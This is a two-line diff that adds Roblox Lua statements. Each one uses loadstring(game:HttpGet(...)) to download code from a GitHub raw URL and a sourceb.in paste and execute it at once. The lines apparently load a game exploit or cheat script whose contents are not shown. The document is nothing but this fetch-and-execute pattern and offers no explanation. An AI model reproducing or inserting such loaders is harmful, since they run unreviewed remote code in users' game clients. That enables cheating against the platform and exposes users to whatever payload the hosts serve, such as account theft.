@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevPilotZero/GAG/refs/heads/main/DevX-1.0"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/kkGdnvMA5S/0", true))()
